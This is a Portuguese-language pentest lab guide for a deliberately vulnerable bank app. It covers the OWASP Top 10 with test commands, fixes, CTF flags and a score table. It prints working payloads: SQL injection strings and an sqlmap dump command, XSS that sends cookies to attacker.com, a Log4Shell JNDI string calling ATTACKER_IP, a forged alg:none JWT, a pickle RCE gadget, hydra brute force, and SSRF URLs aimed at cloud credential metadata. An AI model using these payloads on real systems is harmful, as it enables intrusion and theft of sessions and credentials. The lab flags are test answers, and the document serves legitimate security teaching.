# 🐥 Frango's Bank — Guia OWASP Top 10 (2025)
## Laboratório de Pentest Educacional — Galinheiro Hall

---

## A01 — Broken Access Control
**Severidade:** Crítico | **CWE:** 284, 285, 639

### O que é
Usuários conseguem acessar recursos além de suas permissões. A causa mais comum é IDOR (Insecure Direct Object Reference): a aplicação usa IDs controláveis pelo usuário sem verificar autorização.

### Como testar
```
# Troca de ID na URL:
GET /api/account/1001  → sua conta
GET /api/account/1002  → conta de outro usuário

# Força bruta de IDs:
ffuf -u https://target/api/account/FUZZ -w numbers.txt -H "Auth: Bearer TOKEN"

# Burp Suite — Autorize plugin:
# Compara respostas logado vs. não logado automaticamente
```

### Correção
```python
# ERRADO:
def get_account(account_id):
    return db.query(f"SELECT * FROM accounts WHERE id={account_id}")

# CORRETO:
def get_account(account_id, current_user):
    account = db.query("SELECT * FROM accounts WHERE id=?", account_id)
    if account.owner_id != current_user.id:
        raise Forbidden("Acesso negado")
    return account
```

### Flag do Lab
`FLAG{IDOR_FRANGO_A01_MILHO}`

---

## A02 — Cryptographic Failures
**Severidade:** Alto | **CWE:** 261, 296, 310, 319, 321, 326, 327

### O que é
Dados sensíveis transmitidos ou armazenados sem proteção criptográfica adequada. Inclui uso de Base64 "como criptografia", MD5/SHA1 para senhas, HTTP sem TLS.

### Como testar
```bash
# Verificar certificado TLS:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Checar headers HTTP:
curl -I http://target.com  # deve redirecionar para HTTPS

# Decodificar Base64:
echo "dXNlcjpjb3JuZWxpbzpzZW5oYTEyMw==" | base64 -d

# Checar cookies:
# Devem ter flags: Secure; HttpOnly; SameSite=Strict
```

### Algoritmos seguros vs inseguros
| Uso | Inseguro | Seguro |
|-----|----------|--------|
| Senhas | MD5, SHA1, SHA256 | bcrypt, argon2id, scrypt |
| Criptografia | DES, 3DES, RC4 | AES-256-GCM |
| TLS | SSL, TLS 1.0, 1.1 | TLS 1.3 |
| Hash | MD5, SHA1 | SHA-256, SHA-3 |

### Flag do Lab
`FLAG{CRYPTO_FRANGO_A02_BASE64NAOECRYPTO}`

---

## A03 — Injection
**Severidade:** Crítico | **CWE:** 77, 89, 564, 917

### SQL Injection
```sql
-- Payload básico de bypass:
' OR '1'='1
admin'--
' OR 1=1--

-- Union-based dump:
' UNION SELECT user,password,null FROM users--

-- sqlmap automatizado:
sqlmap -u "https://target/login" --data="user=*&pass=test" --dbs --dump
```

### XSS (Cross-Site Scripting)
```html
<!-- Refletido básico: -->
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>

<!-- Roubo de cookies: -->
<script>
  fetch('https://attacker.com/steal?c='+document.cookie)
</script>

<!-- Bypass de filtros: -->
<svg onload=alert(1)>
<body onpageshow=alert(1)>
```

### NoSQL Injection
```json
// MongoDB:
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": "admin", "pass": {"$regex": ".*"}}
```

### Correção
```python
# SQL — Prepared statements:
cursor.execute("SELECT * FROM users WHERE user=? AND pass=?", (user, pass))

# XSS — Escape output:
element.textContent = userInput  # não innerHTML!

# CSP Header:
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Flag do Lab
`FLAG{INJECTION_FRANGO_A03_DROPDATABASE}`

---

## A04 — Insecure Design
**Severidade:** Alto | **CWE:** 73, 183, 209, 256, 419, 434

### O que é
Falhas na lógica de negócio que não são bugs de implementação, mas de arquitetura. Race conditions, valores negativos, pulo de etapas de pagamento.

### Como testar
```bash
# Race condition com curl:
for i in 1 2 3; do
  curl -X POST https://target/api/transfer \
    -d '{"amount":1000}' \
    -H "Auth: Bearer TOKEN" &
done

# Turbo Intruder (Burp) para race conditions precisas

# Valor negativo:
{"amount": -500}  # débito negativo = crédito!

# Pular etapas de pagamento:
# Ir direto para /checkout/confirm sem passar por /checkout/payment
```

### Correção
```python
# Transação atômica (PostgreSQL):
with db.transaction():
    balance = db.select_for_update("SELECT balance FROM accounts WHERE id=?", id)
    if balance < amount:
        raise InsufficientFunds()
    if amount <= 0:
        raise InvalidAmount()
    db.execute("UPDATE accounts SET balance=balance-? WHERE id=?", amount, id)
```

### Flag do Lab
`FLAG{DESIGN_FRANGO_A04_RACECONDICAO}`

---

## A05 — Security Misconfiguration
**Severidade:** Médio | **CWE:** 2, 11, 13, 15, 16

### Como testar
```bash
# Reconhecimento de headers:
curl -I https://target.com
nikto -h https://target.com

# Busca de diretórios:
gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt
dirsearch -u https://target -e php,bak,sql,env,git,zip,tar

# Endpoints críticos:
/.env           # variáveis de ambiente
/.git/config    # repositório git exposto
/backup.sql     # backup do banco
/phpinfo.php    # informações do servidor
/admin          # painel admin
/swagger.json   # documentação de API
/actuator       # Spring Boot actuator
```

### Headers de segurança obrigatórios
```
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

### Flag do Lab
`FLAG{MISCONFIG_FRANGO_A05_ADMINEXPOSTO}`

---

## A06 — Vulnerable & Outdated Components
**Severidade:** Médio | **CWE:** 937, 1035

### CVEs famosos
| Componente | CVE | CVSS | Impacto |
|------------|-----|------|---------|
| Log4j 2.0-2.14 | CVE-2021-44228 | 10.0 | RCE via JNDI |
| Spring Boot <2.5.12 | CVE-2022-22965 | 9.8 | RCE |
| OpenSSL 1.0.1 | CVE-2014-0160 | 7.5 | Heartbleed |
| jQuery <3.5 | CVE-2019-11358 | 6.1 | Prototype pollution |

### Como testar
```bash
# Identificar tecnologias:
whatweb https://target.com
wappalyzer  # extensão do browser

# Checar dependências:
npm audit          # Node.js
pip-audit          # Python
mvn dependency:tree | grep -v test  # Java

# OWASP Dependency Check:
dependency-check --project "FrangosBank" --scan /app --out report/

# Log4Shell payload:
# No campo User-Agent, X-Forwarded-For, ou qualquer campo logado:
${jndi:ldap://ATTACKER_IP:1389/exploit}
```

### Flag do Lab
`FLAG{COMPONENTS_FRANGO_A06_LOG4SHELL}`

---

## A07 — Identification & Authentication Failures
**Severidade:** Alto | **CWE:** 255, 259, 287, 288, 290, 294, 295, 297, 300, 302, 304, 306, 307, 346, 384, 521, 613, 620

### Como testar
```bash
# Brute force com Hydra:
hydra -l admin@target.com \
      -P /usr/share/wordlists/rockyou.txt \
      target.com http-post-form \
      "/login:email=^USER^&password=^PASS^:Senha incorreta"

# Checar política de senhas:
# Tente senhas como: 123456, admin, password

# Verificar expiração de sessão:
# Faça logout e tente reusar o token

# Token previsível:
# Se token = base64(user+timestamp), incrementar timestamp

# Credential stuffing:
# Usar listas de vazamentos (HaveIBeenPwned)
```

### Correção
```python
# Rate limiting:
@limiter.limit("5 per minute")
def login():
    pass

# Lockout após N tentativas:
if failed_attempts >= 5:
    lock_account(user, duration=15*60)

# MFA obrigatório para operações críticas:
# TOTP (Google Authenticator), SMS, hardware key
```

### Flag do Lab
`FLAG{AUTH_FRANGO_A07_BRUTEFORCE}`

---

## A08 — Software & Data Integrity Failures
**Severidade:** Médio | **CWE:** 345, 353, 426, 494, 502, 565, 784, 829, 830

### JWT Manipulation
```python
# JWT com algoritmo "none":
import base64, json

header = base64.b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).decode().rstrip('=')

payload = base64.b64encode(
    json.dumps({"user":"cornelio","role":"admin"}).encode()
).decode().rstrip('=')

forged_token = f"{header}.{payload}."  # sem assinatura!

# Ferramenta: jwt_tool
python3 jwt_tool.py TOKEN -X a   # testa alg:none
python3 jwt_tool.py TOKEN -T      # tamper interativo
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack secret
```

### Deserialização insegura
```python
# Python pickle (PERIGOSO):
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Se o servidor fizer pickle.loads(payload) → RCE!
```

### Flag do Lab
`FLAG{INTEGRITY_FRANGO_A08_JWTFORJADO}`

---

## A09 — Security Logging & Monitoring Failures
**Severidade:** Baixo | **CWE:** 117, 223, 532, 778

### O que deve ser logado
```
✅ Logins (sucesso e falha) com IP e timestamp
✅ Mudanças de senha e dados cadastrais
✅ Transferências e operações financeiras
✅ Acessos a dados sensíveis
✅ Erros de autorização (403)
✅ Anomalias de comportamento

❌ Nunca logar: senhas, tokens, cartões, CPF completo
```

### Como testar
```bash
# Buscar logs expostos:
curl https://target.com/logs/app.log
curl https://target.com/debug/console
curl https://target.com/error.log

# Log Injection:
# Login com username: admin\nINFO: Admin login from 127.0.0.1
# Pode falsificar entradas no log!

# Verificar ausência de alertas:
# Fazer 100 logins falhos → o sistema alertou? Bloqueou?
```

### Flag do Lab
`FLAG{LOGGING_FRANGO_A09_SEMMONITOR}`

---

## A10 — Server-Side Request Forgery (SSRF)
**Severidade:** Alto | **CWE:** 918

### Como testar
```bash
# URLs internas para testar:
http://localhost/admin
http://127.0.0.1:8080
http://192.168.1.1
http://10.0.0.1

# AWS Metadata (crítico):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata:
http://metadata.google.internal/computeMetadata/v1/
-H "Metadata-Flavor: Google"

# Bypass de filtros:
http://2130706433/       # 127.0.0.1 em decimal
http://0x7f000001/       # 127.0.0.1 em hex
http://127.1/            # forma abreviada
http://localtest.me/     # resolve para 127.0.0.1
dict://localhost:6379/   # Redis sem auth

# Ferramenta: SSRFmap
python3 ssrfmap.py -r req.txt -p url -m readfiles,portscan
```

### Correção
```python
import ipaddress, socket

def is_safe_url(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)
    addr = ipaddress.ip_address(ip)
    # Bloquear IPs privados, loopback, link-local:
    if addr.is_private or addr.is_loopback or addr.is_link_local:
        raise ValueError("URL interna não permitida")
    return True
```

### Flag do Lab
`FLAG{SSRF_FRANGO_A10_METADATAAWS}`

---

## Ferramentas Recomendadas

| Categoria | Ferramenta | Uso |
|-----------|-----------|-----|
| Proxy | Burp Suite Community | Intercept, modify, replay |
| Scanner | OWASP ZAP | Scan automático |
| Fuzzer | ffuf, dirsearch | Descoberta de endpoints |
| SQLi | sqlmap | Exploração automática |
| Brute force | hydra, medusa | Ataque de credenciais |
| JWT | jwt_tool | Manipulação de tokens |
| SSRF | SSRFmap | Exploração de SSRF |
| Recon | nikto, whatweb | Reconhecimento |
| Deps | dependency-check | Componentes vulneráveis |
| CVEs | searchsploit | Exploits conhecidos |

---

## Score do Laboratório

| Desafio | Pontos |
|---------|--------|
| A01 — IDOR | 100 pts |
| A02 — Crypto | 100 pts |
| A03 — Injection | 150 pts |
| A04 — Design | 150 pts |
| A05 — Misconfig | 100 pts |
| A06 — Components | 100 pts |
| A07 — Auth | 100 pts |
| A08 — Integrity | 150 pts |
| A09 — Logging | 100 pts |
| A10 — SSRF | 150 pts |
| **Total** | **1200 pts** |

---

*Frango's Bank DVWA Lab — Galinheiro Hall Security Team*
*Uso exclusivo para fins educacionais em ambientes controlados.*
